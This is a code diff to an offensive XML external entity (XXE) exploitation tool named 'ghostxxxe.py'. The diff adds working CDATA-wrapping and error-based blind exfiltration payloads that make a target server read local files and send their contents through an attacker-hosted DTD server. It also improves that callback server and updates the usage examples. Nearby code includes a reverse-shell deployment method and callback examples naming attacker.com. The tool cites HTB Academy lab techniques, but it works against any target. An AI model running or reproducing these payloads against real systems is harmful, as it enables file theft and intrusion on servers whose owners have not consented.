@@ -107,7 +107,11 @@ class OOBServer(BaseHTTPRequestHandler):
             self.send_response(200)
             self.send_header('Content-type', 'application/xml-dtd')
             self.end_headers()
-            self.wfile.write(OOBServer.dtd_payload.encode())
+            # dtd_payload is already bytes, don't encode again
+            if isinstance(OOBServer.dtd_payload, bytes):
+                self.wfile.write(OOBServer.dtd_payload)
+            else:
+                self.wfile.write(OOBServer.dtd_payload.encode())
         else:
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
@@ -465,6 +469,57 @@ public string execute(){
 <xsl:copy-of select="document('{target_url}')"/>
 </xsl:template>
 </xsl:stylesheet>'''
+    
+    @staticmethod
+    def xxe_cdata_exfiltration(callback_url: str, file_path: str) -> Tuple[str, str]:
+        """
+        Advanced CDATA wrapping for reading files with special characters
+        Requires hosting external DTD on attacker server
+        Based on HTB Academy Advanced XXE techniques
+        """
+        # DTD content to host on attacker server
+        dtd_content = '''<!ENTITY joined "%begin;%file;%end;">'''
+        
+        # XML payload to send to target
+        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file://{file_path}">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "{callback_url}/xxe.dtd">
+  %xxe;
+]>
+<root>
+<name>test</name>
+<email>&joined;</email>
+</root>'''
+        
+        return xml_payload, dtd_content
+    
+    @staticmethod
+    def xxe_error_based_exfiltration(callback_url: str, file_path: str) -> Tuple[str, str]:
+        """
+        Error-Based XXE for blind exploitation
+        Forces errors to exfiltrate data when no output is displayed
+        Based on HTB Academy Advanced XXE techniques
+        """
+        # DTD content to host on attacker server
+        dtd_content = f'''<!ENTITY % file SYSTEM "file://{file_path}">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">'''
+        
+        # XML payload to send to target
+        xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY % remote SYSTEM "{callback_url}/xxe.dtd">
+  %remote;
+  %error;
+]>
+<root>
+<name>test</name>
+<email>test@test.com</email>
+</root>'''
+        
+        return xml_payload, dtd_content
     
     @staticmethod
     def xpath_injection_payloads() -> List[str]:
@@ -918,9 +973,24 @@ class XXEScanner:
     
     def __init__(self, args):
         self.target_url = args.url
-        self.callback_url = args.callback
         self.callback_ip = args.callback_ip
         self.callback_port = args.callback_port or 8080
+        
+        # Build callback URL - respect custom port if provided
+        if args.callback:
+            # User provided full URL
+            self.callback_url = args.callback
+            # Extract port from URL if present, otherwise use callback_port
+            import re
+            port_match = re.search(r':(\d+)', args.callback)
+            if port_match:
+                self.callback_port = int(port_match.group(1))
+        elif args.callback_ip:
+            # Build URL from IP and port
+            self.callback_url = f"http://{args.callback_ip}:{self.callback_port}"
+        else:
+            self.callback_url = None
+        
         self.method = args.method.upper()
         self.headers = self._parse_headers(args.headers)
         self.cookies = self._parse_cookies(args.cookies)
@@ -1924,6 +1994,278 @@ class XXEScanner:
         
         return False
     
+    def test_xxe_cdata_exfiltration(self, file_path: str = None) -> bool:
+        """Test CDATA wrapping for advanced file exfiltration"""
+        if not self.callback_url:
+            print(f"{Colors.WARNING}[-] CDATA exfiltration requires --callback or --callback-ip{Colors.RESET}")
+            print(f"{Colors.INFO}[*] Usage: --callback-ip YOUR_IP --callback-port 8080{Colors.RESET}")
+            return False
+        
+        file_path = file_path or self.file_path
+        
+        print(f"\n{Colors.HEADER}[*] Testing CDATA Wrapping Exfiltration{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Callback: {self.callback_url}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Callback Port: {self.callback_port}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] This bypasses XML format restrictions{Colors.RESET}")
+        
+        # First, detect working XML structure if not already done
+        if not self.working_structure:
+            print(f"\n{Colors.INFO}[*] Detecting working XML structure first...{Colors.RESET}")
+            if not self.detect_xxe_entity_injection():
+                print(f"{Colors.WARNING}[!] Could not detect working XML structure{Colors.RESET}")
+                print(f"{Colors.WARNING}[!] Proceeding with generic CDATA payload anyway...{Colors.RESET}")
+        
+        # Start OOB server
+        self._start_oob_server()
+        
+        # Generate payloads
+        if self.working_structure:
+            # Use detected structure
+            print(f"\n{Colors.SUCCESS}[+] Using detected XML structure for CDATA payload{Colors.RESET}")
+            
+            # Build CDATA payload with detected structure
+            dtd_content = '''<!ENTITY joined "%begin;%file;%end;">'''
+            
+            # Replace the test entity with CDATA wrapper
+            xml_payload = self.working_structure.replace(
+                '<!ENTITY ghosttest "{test_value}">',
+                f'''<!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file://{file_path}">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "{self.callback_url}/xxe.dtd">
+  %xxe;'''
+            ).replace('&ghosttest;', '&joined;')
+        else:
+            # Fallback to generic payload
+            xml_payload, dtd_content = PayloadGenerator.xxe_cdata_exfiltration(self.callback_url, file_path)
+        
+        # Set DTD content for server
+        OOBServer.dtd_payload = dtd_content.encode()
+        
+        print(f"\n{Colors.INFO}[*] DTD Content (hosted on your server at {self.callback_url}/xxe.dtd):{Colors.RESET}")
+        print(f"{Colors.PAYLOAD}{dtd_content}{Colors.RESET}")
+        
+        print(f"\n{Colors.INFO}[*] Sending CDATA payload...{Colors.RESET}")
+        if self.verbose:
+            print(f"\n{Colors.PAYLOAD}Payload:{Colors.RESET}")
+            print(xml_payload)
+        
+        response = self.send_payload(xml_payload, f"CDATA Exfiltration - {file_path}")
+        
+        if response:
+            print(f"\n{Colors.SUCCESS}[+] Payload sent! Response received:{Colors.RESET}")
+            print(f"{Colors.INFO}[*] Response length: {len(response.text)}{Colors.RESET}")
+            
+            # Check if file content appears in response wrapped in CDATA
+            if '<![CDATA[' in response.text:
+                print(f"\n{Colors.SUCCESS}[!] CDATA tags found in response!{Colors.RESET}")
+                print(f"{Colors.SUCCESS}[+] File content retrieved{Colors.RESET}")
+                
+                # Extract CDATA content
+                import re
+                cdata_match = re.search(r'<!\[CDATA\[(.*?)\]\]>', response.text, re.DOTALL)
+                if cdata_match:
+                    file_content = cdata_match.group(1)
+                    print(f"\n{Colors.SUCCESS}📄 FILE CONTENT:{Colors.RESET}")
+                    print("=" * 70)
+                    print(file_content[:2000])
+                    if len(file_content) > 2000:
+                        print(f"\n... [Content truncated - {len(file_content)} total bytes]")
+                    print("=" * 70)
+                
+                self.vulnerabilities_found.append({
+                    'type': 'XXE CDATA Exfiltration',
+                    'payload': xml_payload,
+                    'file': file_path
+                })
+                return True
+            
+            # Check if &joined; entity was processed
+            elif '&joined;' not in response.text and len(response.text) > 100:
+                print(f"\n{Colors.SUCCESS}[+] Entity processed! Checking for file content...{Colors.RESET}")
+                print(f"\n{Colors.INFO}[*] Response preview:{Colors.RESET}")
+                print(response.text[:500])
+                
+                # Check for PHP tags or other file indicators
+                if '<?php' in response.text or 'function' in response.text or file_path.split('/')[-1] in response.text:
+                    print(f"\n{Colors.SUCCESS}[!] File content may be present in response!{Colors.RESET}")
+                    self.vulnerabilities_found.append({
+                        'type': 'XXE CDATA Exfiltration',
+                        'payload': xml_payload,
+                        'file': file_path
+                    })
+                    return True
+            else:
+                print(f"\n{Colors.WARNING}[-] Response preview:{Colors.RESET}")
+                print(response.text[:200])
+        
+        print(f"\n{Colors.WARNING}[-] CDATA exfiltration did not return expected data{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Possible reasons:{Colors.RESET}")
+        print(f"{Colors.INFO}    - Target didn't fetch xxe.dtd from {self.callback_url}{Colors.RESET}")
+        print(f"{Colors.INFO}    - External DTD loading is disabled{Colors.RESET}")
+        print(f"{Colors.INFO}    - Network connectivity issue{Colors.RESET}")
+        return False
+    
+    def test_xxe_error_based_exfiltration(self, file_path: str = None) -> bool:
+        """Test Error-Based XXE for blind exploitation"""
+        if not self.callback_url:
+            print(f"{Colors.WARNING}[-] Error-based exfiltration requires --callback or --callback-ip{Colors.RESET}")
+            print(f"{Colors.INFO}[*] Usage: --callback-ip YOUR_IP --callback-port 9000{Colors.RESET}")
+            return False
+        
+        file_path = file_path or self.file_path
+        
+        print(f"\n{Colors.HEADER}[*] Testing Error-Based XXE Exfiltration{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Target file: {file_path}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Callback: {self.callback_url}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Callback Port: {self.callback_port}{Colors.RESET}")
+        print(f"{Colors.INFO}[*] Forces errors to exfiltrate data (blind XXE){Colors.RESET}")
+        
+        # Start OOB server
+        self._start_oob_server()
+        
+        # Generate payloads
+        xml_payload, dtd_content = PayloadGenerator.xxe_error_based_exfiltration(self.callback_url, file_path)
+        
+        # Set DTD content for server
+        OOBServer.dtd_payload = dtd_content.encode()
+        
+        print(f"\n{Colors.INFO}[*] DTD Content (save as xxe.dtd on your server):{Colors.RESET}")
+        print(f"{Colors.PAYLOAD}{dtd_content}{Colors.RESET}")
+        
+        print(f"\n{Colors.INFO}[*] Sending error-based payload...{Colors.RESET}")
+        response = self.send_payload(xml_payload, f"Error-Based Exfiltration - {file_path}")
+        
+        if response:
+            # Check if error message contains file content
+            error_indicators = [
+                'failed to load external entity',
+                'nonExistingEntity',
+                'Parser error',
+                'XML parsing error',
+                'DOMDocument::loadXML',
+                'Invalid URI',
+                'loadXML()',
+                'Entity',
+                file_path
+            ]
+            
+            has_error = any(indicator.lower() in response.text.lower() for indicator in error_indicators)
+            
+            if has_error:
+                print(f"\n{Colors.SUCCESS}[!] Error-based exfiltration successful!{Colors.RESET}")
+                print(f"{Colors.SUCCESS}[+] File content leaked via error message!{Colors.RESET}")
+                
+                import re
+                import html
+                
+                # HTML decode the entire response
+                decoded_response = html.unescape(response.text)
+                
+                # Remove HTML tags for cleaner reading
+                text_only = re.sub(r'<script[^>]*>.*?</script>', '', decoded_response, flags=re.DOTALL | re.IGNORECASE)
+                text_only = re.sub(r'<style[^>]*>.*?</style>', '', text_only, flags=re.DOTALL | re.IGNORECASE)
+                text_only = re.sub(r'<[^>]+>', '\n', text_only)  # Replace tags with newlines
+                text_only = re.sub(r'\n\s*\n', '\n', text_only)  # Remove multiple blank lines
+                text_only = text_only.strip()
+                
+                # Extract file content from "Invalid URI" errors
+                file_content = None
+                uri_match = re.search(r'Invalid URI:\s*/([^/\n]+)', decoded_response, re.IGNORECASE)
+                if uri_match:
+                    file_content = '/' + uri_match.group(1)
+                
+                # Alternative: Extract from entity errors
+                if not file_content:
+                    entity_match = re.search(r'Entity.*?:\s*/([^\s<\n]+)', decoded_response, re.IGNORECASE)
+                    if entity_match:
+                        file_content = '/' + entity_match.group(1)
+                
+                # Look for content between markers
+                if not file_content:
+                    # Try to find actual file content (anything between / and "in Entity" or similar)
+                    content_match = re.search(r':\s*(/[^:]+?)\s+in\s+(?:Entity|<b>)', decoded_response, re.IGNORECASE)
+                    if content_match:
+                        file_content = content_match.group(1).strip()
+                
+                # Show extracted file content
+                if file_content:
+                    print(f"\n{Colors.SUCCESS}📄 EXTRACTED FILE CONTENT:{Colors.RESET}")
+                    print("=" * 70)
+                    print(file_content)
+                    print("=" * 70)
+                
+                # Look for flags
+                flag_patterns = [
+                    r'HTB\{[^}]+\}',
+                    r'FLAG\{[^}]+\}',
+                    r'flag\{[^}]+\}',
+                    r'\$flag\s*=\s*["\']([^"\']+)["\']',
+                ]
+                
+                flags_found = []
+                for pattern in flag_patterns:
+                    matches = re.findall(pattern, decoded_response, re.IGNORECASE)
+                    flags_found.extend(matches)
+                
+                if flags_found:
+                    print(f"\n{Colors.SUCCESS}🚩 FLAGS DETECTED:{Colors.RESET}")
+                    print("=" * 70)
+                    for flag in set(flags_found):
+                        print(f"{Colors.SUCCESS}{flag}{Colors.RESET}")
+                    print("=" * 70)
+                
+                # Show complete decoded error (most important for real-world testing)
+                print(f"\n{Colors.INFO}[*] COMPLETE DECODED ERROR MESSAGE:{Colors.RESET}")
+                print(f"{Colors.INFO}[*] (Check for credentials, API keys, config data, etc.){Colors.RESET}")
+                print("=" * 70)
+                
+                # Find and display the error section
+                error_lines = []
+                for line in text_only.split('\n'):
+                    line = line.strip()
+                    if not line:
+                        continue
+                    # Include lines with error indicators or that look like content
+                    if any(ind.lower() in line.lower() for ind in error_indicators) or \
+                       'warning' in line.lower() or 'notice' in line.lower() or \
+                       '<?php' in line.lower() or '$' in line or '{' in line:
+                        error_lines.append(line)
+                
+                if error_lines:
+                    print('\n'.join(error_lines[:50]))  # Show up to 50 relevant lines
+                else:
+                    # Fallback: show raw decoded response
+                    print(decoded_response[:2000])
+                
+                print("=" * 70)
+                
+                # Save full response to file for analysis
+                output_file = f"/tmp/xxe_error_{file_path.replace('/', '_')}.txt"
+                try:
+                    with open(output_file, 'w') as f:
+                        f.write("="*70 + "\n")
+                        f.write("FULL HTML-DECODED ERROR RESPONSE\n")
+                        f.write("="*70 + "\n\n")
+                        f.write(decoded_response)
+                    print(f"\n{Colors.INFO}[*] Full response saved to: {output_file}{Colors.RESET}")
+                except:
+                    pass
+                
+                self.vulnerabilities_found.append({
+                    'type': 'XXE Error-Based Exfiltration',
+                    'payload': xml_payload,
+                    'file': file_path,
+                    'response': response.text[:500],
+                    'flags': flags_found if flags_found else None,
+                    'file_content': file_content if file_content else None
+                })
+                return True
+        
+        print(f"{Colors.WARNING}[-] Error-based exfiltration did not trigger expected errors{Colors.RESET}")
+        return False
+    
     def exploit_oob_http(self) -> bool:
         """Exploit XXE with OOB HTTP callback"""
         if not self.callback_url:
@@ -1963,16 +2305,38 @@ class XXEScanner:
         """Start OOB HTTP server in background thread"""
         print(f"{Colors.INFO}[*] Starting OOB server on port {self.callback_port}...{Colors.RESET}")
         
+        # Test if port is available before starting server
+        import socket
+        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        
+        try:
+            test_socket.bind(('0.0.0.0', self.callback_port))
+            test_socket.close()
+        except OSError as e:
+            if e.errno == 98:  # Address already in use
+                print(f"{Colors.ERROR}[!] ERROR: Port {self.callback_port} is already in use!{Colors.RESET}")
+                print(f"{Colors.WARNING}[*] Solutions:{Colors.RESET}")
+                print(f"{Colors.INFO}    1. Use different port: --callback-port 8002{Colors.RESET}")
+                print(f"{Colors.INFO}    2. Find what's using it: sudo netstat -tulpn | grep :{self.callback_port}{Colors.RESET}")
+                print(f"{Colors.INFO}    3. Kill the process: sudo lsof -ti:{self.callback_port} | xargs kill{Colors.RESET}")
+                raise RuntimeError(f"Port {self.callback_port} is already in use")
+            else:
+                raise
+        
         def run_server():
-            server = HTTPServer(('0.0.0.0', self.callback_port), OOBServer)
-            server.timeout = 1
-            for _ in range(10):  # Run for 10 seconds
-                server.handle_request()
+            try:
+                server = HTTPServer(('0.0.0.0', self.callback_port), OOBServer)
+                server.timeout = 1
+                print(f"{Colors.SUCCESS}[+] OOB server successfully bound to port {self.callback_port}{Colors.RESET}")
+                for _ in range(30):  # Run for 30 seconds
+                    server.handle_request()
+            except Exception as e:
+                print(f"{Colors.ERROR}[!] Server error: {e}{Colors.RESET}")
         
         server_thread = threading.Thread(target=run_server, daemon=True)
         server_thread.start()
-        time.sleep(1)
-        print(f"{Colors.SUCCESS}[+] OOB server started{Colors.RESET}")
+        time.sleep(1)  # Give server time to start
     
     def deploy_reverse_shell(self, attacker_ip: str, attacker_port: int):
         """Deploy reverse shell via XXE"""
@@ -3016,29 +3380,26 @@ Examples:
   # Vulnerability discovery scan (test if vulnerable)
   python3 ghostxxxe.py -u http://target.com/api -m POST --scan
   
-  # Scan multiple targets from file
-  python3 ghostxxxe.py -l targets.txt -m POST --scan
+  # Read specific file
+  python3 ghostxxxe.py -u http://target.com/api -m POST -f connection.php -v
   
-  # Batch scan with multiple threads
-  python3 ghostxxxe.py -l targets.txt -m POST --scan --threads 5
+  # OOB exploitation with callback (custom port)
+  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback-ip YOUR_IP --callback-port 9000
   
-  # Basic XXE exploitation scan
-  python3 ghostxxxe.py -u http://target.com/api -m POST
+  # CDATA wrapping (advanced file exfiltration, custom port)
+  python3 ghostxxxe.py -u http://target.com/api -m POST --cdata --callback-ip YOUR_IP --callback-port 8888 -f submitDetails.php
   
-  # OOB exploitation with callback
-  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback http://attacker.com:8080
+  # Error-Based XXE (blind exploitation, custom port)
+  python3 ghostxxxe.py -u http://target.com/api -m POST --error-based --callback-ip YOUR_IP --callback-port 7777 -f /etc/hosts
   
-  # Test specific file read
-  python3 ghostxxxe.py -u http://target.com/api -m POST -f /etc/shadow
+  # Using full callback URL (port included in URL)
+  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback http://your-ip:9999
   
   # Interactive shell mode
   python3 ghostxxxe.py -u http://target.com/api -m POST --interactive
   
-  # Deploy reverse shell
-  python3 ghostxxxe.py -u http://target.com/api -m POST --reverse-shell --attacker-ip 10.0.0.1 --attacker-port 4444
-  
-  # Full scan with custom headers and proxy
-  python3 ghostxxxe.py -u http://target.com/api -m POST -H "Authorization: Bearer token" --proxy http://127.0.0.1:8080 -v
+  # Full scan with proxy
+  python3 ghostxxxe.py -u http://target.com/api -m POST --advanced --proxy http://127.0.0.1:8080 -v
 
 👻 Ghost Ops Security - Where Hackers Fear to Tread 👻
         '''
@@ -3065,6 +3426,10 @@ Examples:
     parser.add_argument('--callback', help='Callback URL for OOB (e.g. http://attacker.com)')
     parser.add_argument('--callback-ip', help='Callback IP for OOB server')
     parser.add_argument('--callback-port', type=int, help='Callback port for OOB server (default: 8080)')
+    parser.add_argument('--cdata', action='store_true', 
+                       help='Use CDATA wrapping for advanced file exfiltration (requires callback)')
+    parser.add_argument('--error-based', action='store_true',
+                       help='Use Error-Based XXE for blind exploitation (requires callback)')
     
     # Exploitation modes
     parser.add_argument('--interactive', action='store_true', help='Interactive command execution mode')
@@ -3227,6 +3592,20 @@ Examples:
             
         elif args.oob:
             scanner.exploit_oob_http()
+        
+        elif args.cdata:
+            # CDATA wrapping exfiltration
+            if not args.callback and not args.callback_ip:
+                print(f"{Colors.ERROR}[-] --callback or --callback-ip required for CDATA exfiltration{Colors.RESET}")
+                return
+            scanner.test_xxe_cdata_exfiltration(args.file)
+        
+        elif args.error_based:
+            # Error-Based XXE exfiltration
+            if not args.callback and not args.callback_ip:
+                print(f"{Colors.ERROR}[-] --callback or --callback-ip required for error-based exfiltration{Colors.RESET}")
+                return
+            scanner.test_xxe_error_based_exfiltration(args.file)
         
         elif args.command:
             # Test RCE with specific command
